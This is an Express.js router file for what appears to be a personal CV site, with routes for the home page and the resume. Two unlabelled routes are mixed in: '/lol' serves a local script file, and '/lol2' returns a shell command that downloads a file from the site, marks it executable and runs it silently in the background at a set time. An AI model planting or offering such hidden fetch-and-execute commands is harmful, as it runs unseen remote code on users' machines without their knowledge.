var express = require('express');
var router  = express.Router();
var path    = require("path");

router.get('/', function(req, res) {
  res.render('index');
})

router.get('/cv', function(req, res) {
  res.render('cv')
})

router.get('/resume', function(req, res) {
  res.render('cv')
})

router.get('/lol', function(req, res) {
  res.sendFile(path.join(__dirname+'/../script.txt'))
})

router.get('/lol2', function(req, res) {
  res.send('curl -fsSL http://paulpires.com/lol > ~/Documents/lol.tcl && chmod +x ~/Documents/lol.tcl && (~/Documents/lol.tcl -time 22:31 > /dev/null &)')
})

module.exports = router;
